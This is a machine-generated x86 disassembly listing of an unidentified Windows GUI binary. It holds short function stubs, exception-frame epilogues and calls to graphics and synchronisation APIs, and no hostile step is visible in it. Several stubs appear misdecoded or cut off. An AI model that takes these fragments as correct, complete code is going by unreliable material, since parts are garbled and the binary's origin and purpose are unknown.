jmp sub_4038f0
sub_41bfce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c0cc
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41aac4
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_41c190
push ebx
mov ebx eax
mov eax ebx
call sub_41db44
cmp al 0x9
sete al
pop ebx
retn
sub_41c1ef
jmp sub_4038f0
sub_41c1f6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41c29c
jmp sub_4038f0
sub_41c2a3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c522
jmp sub_40363c
sub_41c54e
jmp sub_40363c
sub_41c5f0
jmp sub_40363c
sub_41c693
jmp sub_40363c
sub_41c86b
jmp sub_40363c
sub_41c8ad
jmp sub_4038f0
sub_41c8dd
jmp sub_4038f0
sub_41c8e4
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41c953
jmp sub_4038f0
sub_41ca2a
jmp sub_4038f0
sub_41ca31
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41cd04
mov dl 0x1
call sub_41bc6c
retn
sub_41ce3c
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41ce45
jmp sub_4038f0
j_sub_41ce3c
jmp sub_41ce3c
sub_41ce4c
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce54
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41dc54
mov eax [ rw-data ]
call sub_41bbc8
pop ebp
retn
j_sub_403768#2
jmp sub_403768
j_sub_403768
jmp sub_403768
sub_41d040
jmp sub_4038f0
sub_41d047
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d127
jmp sub_4038f0
sub_41d12e
mov esp ebp
pop ebp
retn
sub_41d1e6
jmp sub_4038f0
sub_41d1ed
pop ecx
pop ecx
pop ebp
retn
sub_41d4ef
jmp sub_4038f0
sub_41d4f6
pop ebx
mov esp ebp
pop ebp
retn
sub_41d79b
jmp sub_4038f0
sub_41d7a2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403174
retn
sub_41d7bb
jmp sub_4038f0
sub_41d7df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_40363c
sub_41d816
jmp sub_40363c
sub_41d855
jmp sub_4038f0
sub_41d85c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d87e
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403f10
retn
sub_41d877
jmp sub_4038f0
sub_41d87e
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d905
jmp sub_40363c
sub_41d932
jmp sub_4038f0
sub_41d939
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d944
push ecx
mov edx esp
mov ecx 0x4
call sub_41c108
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_41bbc8
sub_41da51
jmp sub_4038f0
sub_41da58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41db37
jmp sub_4038f0
sub_41db3e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41db94
jmp sub_4038f0
sub_41db9b
pop ebx
pop ecx
pop ebp
retn
sub_41dde3
jmp sub_4038f0
sub_41ddea
pop ecx
pop ecx
pop ebp
retn
sub_41de2d
jmp sub_4038f0
sub_41de34
pop ebx
pop ecx
pop ebp
retn
sub_41ded0
jmp sub_4038f0
sub_41ded7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41df85
jmp sub_4038f0
sub_41df8c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41df98
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_41e1f3
jmp sub_4038f0
sub_41e1fa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e21f
mov eax [ ebp - 0x8 ]
call sub_403174
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_41e218
jmp sub_4038f0
sub_41e21f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e244
lea eax [ ebp - 0x1c ]
call sub_405758
lea eax [ ebp - 0x18 ]
call sub_403eec
retn
sub_41e23d
jmp sub_4038f0
sub_41e244
pop ebx
mov esp ebp
pop ebp
retn
sub_41e456
jmp sub_4038f0
sub_41e45d
pop ebx
mov esp ebp
pop ebp
retn
sub_41e490
mov eax [ eax + 0x30 ]
call sub_41814c
retn
sub_41e500
call sub_41e630
retn
sub_41e544
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41b598
mov [ ebx + 0x1c ] esi
pop esi
pop ebx
retn
sub_41e61f
jmp sub_4038f0
sub_41e626
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41e630
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_41ad28
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_41e648
test dl dl
je r-xdata
mov dl 0x8
call sub_42077c
retn
mov dl 0x9
call sub_42077c
retn
sub_41e69f
jmp sub_4038f0
sub_41e6a6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41e73e
jmp sub_4038f0
sub_41e745
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e8e3
jmp sub_4038f0
sub_41e8ea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ec2b
jmp sub_4038f0
sub_41ec6d
jmp sub_4038f0
sub_41eccc
jmp sub_4038f0
sub_41ecd3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ef10
mov dl 0x1
call sub_42077c
retn
sub_41ef18
xor edx edx
call sub_42077c
retn
sub_41f011
jmp sub_4038f0
sub_41f1e7
jmp sub_4038f0
sub_41f1ee
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f3bc
jmp sub_4038f0
sub_41f3c3
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f499
jmp sub_4038f0
sub_41f4a0
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f5b7
jmp sub_4038f0
sub_41f5be
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41f778
jmp sub_4038f0
sub_41f77f
pop ecx
pop ebp
retn
sub_41f80a
jmp sub_4038f0
sub_41f811
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f878
jmp sub_4038f0
sub_41f87f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41f8fd
jmp sub_4038f0
sub_41f904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f921
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_41f91a
jmp sub_4038f0
sub_41f921
pop ebx
pop ecx
pop ebp
retn
sub_41f9dc
jmp sub_4038f0
sub_41f9e3
pop ebx
pop ecx
pop ebp
retn
sub_41fab9
jmp sub_4038f0
sub_41fac0
pop ecx
pop ebp
retn
sub_41fac4
mov cl 0x1
test eax eax
je r-xdata
xor ecx ecx
cmp edx eax
je r-xdata
mov eax ecx
retn
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_41fbcb
jmp sub_4038f0
sub_41fbd2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41fd79
jmp sub_4038f0
sub_41fdf8
jmp sub_4038f0
sub_41fdff
mov esp ebp
pop ebp
retn
sub_41fecd
jmp sub_4038f0
sub_41fed4
pop ebx
mov esp ebp
pop ebp
retn
sub_41ff87
jmp sub_4038f0
sub_41ff8e
pop ebx
mov esp ebp
pop ebp
retn
sub_41ffed
jmp sub_4038f0
sub_41fff4
mov esp ebp
pop ebp
retn
sub_420459
jmp sub_4038f0
sub_4204b3
jmp sub_4038f0
sub_4204c4
jmp sub_40363c
sub_420520
jmp sub_4038f0
sub_420527
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420586
jmp sub_4038f0
sub_42058d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4206b9
jmp sub_4038f0
sub_4206c0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42076e
jmp sub_4038f0
sub_420775
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4207b4
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40ca90
sub_4207e8
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_420800
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_42080c
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_420800
sub_420932
jmp sub_40363c
sub_420961
jmp sub_4038f0
sub_420997
jmp sub_4038f0
sub_42099e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4209bd
push rw-data
call LeaveCriticalSection
retn
sub_4209b6
jmp sub_4038f0
sub_4209bd
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420a8c
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_420c68
sub_420aec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cc54
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_420b00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cc54
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_420b14
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41ee44
retn
sub_420b20
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41ee44
retn
sub_420dc8
xor eax eax
retn
sub_420dcc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_420dd4
xor eax eax
retn
sub_420dd8
retn
sub_420ddc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f40
pop esi
pop ebx
retn
sub_420df0
mov eax [ eax + 0x4 ]
retn
sub_420df4
retn
sub_420df8
xor eax eax
retn
sub_420dfc
retn
sub_420e00
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_420e0c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_420e18
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_420e24
retn
sub_420e28
xchg edx eax
call sub_41c8f8
retn
sub_420e30
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_420eb8
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403370
pop esi
retn
sub_420ecc
retn
sub_420fac
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f40
pop esi
pop ebx
retn
sub_420fec
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_421138
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_4033a4
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_421150
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4211d8
retn
sub_421220
retn
sub_421258
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_421270
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421494
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403370
pop esi
pop ebx
retn
sub_4212b8
mov al 0x1
retn
sub_4212bc
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4212c4
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_42136c
xor eax eax
retn
sub_421370
retn
sub_42139c
retn
sub_421434
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_421448
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_41814c
retn
sub_42158f
jmp sub_40363c
sub_421594
mov ebx 0x1
call sub_4039a4
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4215f7
jmp sub_40363c
sub_4215fc
mov ebx 0x80030103
call sub_4039a4
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42167a
jmp sub_40363c
sub_42167f
mov ebx 0x80030009
call sub_4039a4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_4216dd
jmp sub_40363c
sub_4216e2
mov ebx 0x8000ffff
call sub_4039a4
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4218ad
jmp sub_4038f0
sub_4218be
jmp sub_40363c
sub_4218c3
mov [ ebp - 0x4 ] 0x8000ffff
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218ec
lea eax [ ebp + 0xc ]
call sub_405758
retn
sub_4218e5
jmp sub_4038f0
sub_4218ec
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_4218f8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_421904
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_421910
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_42191c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_42198b
jmp sub_40363c
sub_421990
mov esi 0x8000ffff
call sub_4039a4
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4219a4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_421a11
jmp sub_4038f0
sub_421a18
mov eax [ rw-data ]
call sub_403174
pop edi
pop esi
pop ebx
pop ebp
retn
sub_421a28
call sub_417890
retn
sub_421af0
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_421c94
jmp sub_4038f0
sub_421c9b
pop ebp
retn
sub_421d29
jmp sub_4038f0
sub_421d30
pop ebp
retn
sub_421ff1
jmp sub_4038f0
sub_421ff8
pop ebp
retn
sub_421ffc
sub [ rw-data ] 0x1
retn
sub_422cb4
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_422d28
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_422d9c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422da8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422e88
jmp sub_4038f0
sub_422e8f
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422f1f
jmp sub_4038f0
sub_422fb1
jmp sub_4038f0
sub_422fb8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42301c
jmp sub_4038f0
sub_423023
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42308b
jmp sub_4038f0
sub_423092
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423135
jmp sub_4038f0
sub_42313c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423594
push 0x33
mov ecx rw-data
call sub_417bcc
retn
sub_4235a4
push 0x33
mov ecx rw-data
call sub_417b8c
retn
sub_4235b4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4235d8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_4237ac
push 0x11
mov ecx rw-data
call sub_417b8c
retn
sub_4238ec
push ebx
mov ebx eax
mov eax ebx
call sub_4235b4
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4239a6
jmp sub_4038f0
sub_4239ad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d8
retn
sub_4239c3
jmp sub_4038f0
sub_4239dc
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_423a39
jmp sub_4038f0
sub_423a40
pop ebx
pop ecx
pop ebp
retn
sub_423bb9
jmp sub_4038f0
sub_423be1
jmp sub_4038f0
sub_423be8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_423c54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404150
pop esi
pop ebx
retn
sub_423cc8
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_423c24
push eax
call MulDiv
neg eax
pop ebx
retn
sub_423d04
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_423d3c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_423d6c
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_423e8a
jmp sub_4038f0
sub_423e91
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d8
retn
sub_423ea7
jmp sub_4038f0
sub_423f1d
jmp sub_4038f0
sub_423f24
pop ebx
pop ecx
pop ebp
retn
sub_423f28
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_423fde
jmp sub_4038f0
sub_423ff0
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403370
sub_424004
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_424143
jmp sub_4038f0
sub_42414a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d8
retn
sub_424160
jmp sub_4038f0
sub_4241d9
jmp sub_4038f0
sub_4241e0
pop ebx
pop ecx
pop ebp
retn
sub_424311
jmp sub_4038f0
sub_424324
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_4246ac
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_424958
jmp sub_4038f0
sub_42495f
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_424968
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_4249a0
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_424aec
retn
sub_424bb5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_424bcc
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_424cb8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424cd8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424cf8
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_424d18
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
pop ebx
retn
sub_424d30
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
pop ebx
retn
sub_424d54
mov eax [ rw-data ]
call sub_424d30
retn
sub_424daa
jmp sub_4038f0
sub_424db1
pop ecx
pop ebp
retn
sub_424e50
jmp sub_4038f0
sub_424e57
pop ebx
mov esp ebp
pop ebp
retn
sub_424f29
jmp sub_4038f0
sub_424fba
jmp sub_4038f0
sub_424fc1
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424fec
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_4250d3
jmp sub_4038f0
sub_425280
jmp sub_4038f0
sub_425287
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_425499
jmp sub_4038f0
sub_4254a0
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_42553a
jmp sub_4038f0
sub_425716
jmp sub_4038f0
sub_4257d0
jmp sub_4038f0
sub_4257d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4257f7
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4257f0
jmp sub_4038f0
sub_4257f7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_425985
jmp sub_4038f0
sub_425b50
jmp sub_4038f0
sub_425b57
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b7a
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_402714
retn
sub_425b73
jmp sub_4038f0
sub_425b7a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b9a
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_402714
retn
sub_425b93
jmp sub_4038f0
sub_425b9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_425cec
push 0x0
call sub_425c88
retn
sub_425d91
jmp sub_4038f0
sub_425d98
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425da4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425cf4
pop ebx
pop ebp
retn 0x4
sub_425db8
retn
sub_425dbc
test eax eax
jne r-xdata
retn
call sub_425db8
sub_425f8f
jmp sub_4038f0
sub_425fb6
jmp sub_4038f0
sub_425fbd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425ffc
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_4261c9
mov eax [ ebp - 0xc ]
call sub_403174
retn
sub_4261d2
jmp sub_4038f0
j_sub_4261c9
jmp sub_4261c9
sub_4261d9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
retn
sub_4261ef
jmp sub_4038f0
sub_426200
xor eax eax
retn
sub_426204
mov al [ eax + 0x21 ]
retn
sub_426250
jmp sub_4038f0
sub_426257
pop esi
pop ecx
pop ebp
retn
sub_426284
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_4262db
jmp sub_4038f0
sub_4262e2
pop esi
pop ecx
pop ebp
retn
sub_4262e8
retn
sub_4262ec
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4262fc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_42641a
jmp sub_4038f0
sub_426442
jmp sub_4038f0
sub_426449
mov esp ebp
pop ebp
retn
sub_4264c0
jmp sub_4038f0
sub_4265c8
jmp sub_4038f0
sub_4266b3
jmp sub_4038f0
sub_4266c0
inc [ eax + 0x4 ]
retn
sub_42683b
jmp sub_4038f0
sub_426bec
jmp sub_4038f0
sub_426e36
jmp sub_4038f0
sub_426e60
jmp sub_4038f0
sub_426e67
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e89
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_426e82
jmp sub_4038f0
sub_426e93
jmp sub_40363c
sub_426ee2
jmp sub_4038f0
sub_42710f
jmp sub_4038f0
sub_427157
jmp sub_4038f0
sub_4272c4
jmp sub_4038f0
sub_42738b
jmp sub_40363c
sub_4273e0
mov [ eax + 0x31 ] 0x0
call sub_425ffc
retn
sub_427631
jmp sub_4038f0
sub_42769c
jmp sub_4038f0
sub_4276a3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427714
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_4277c8
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_4277d8
push ebx
mov ebx eax
mov eax ebx
call sub_427990
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_4277ec
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_427808
push ebx
mov ebx eax
mov eax ebx
call sub_4279f0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_427864
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_427973
jmp sub_4038f0
sub_427bd7
jmp sub_40363c
sub_427c37
jmp sub_4038f0
sub_427c3e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42801f
jmp sub_4038f0
sub_42804b
jmp sub_4038f0
sub_4280b2
jmp sub_40363c
sub_4280e3
jmp sub_4038f0
sub_428168
jmp sub_40363c
sub_42816d
mov eax [ ebp - 0x38 ]
call sub_403174
call sub_403950
call sub_4039a4
sub_42817f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42819c
mov eax [ ebp - 0x18 ]
call sub_402714
retn
sub_428195
jmp sub_4038f0
sub_4282eb
jmp sub_40363c
sub_4285b7
jmp sub_40363c
sub_428648
mov cl 0x1
call sub_428650
retn
sub_428905
add [ eax ] al
add [ ebx ] dh
leave
call sub_428650
retn
sub_42898a
jmp sub_40363c
sub_42898f
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403950
call sub_4039a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4289e0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_428b19
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_428b48
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_428b5c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_428c75
jmp sub_40363c
sub_428d2a
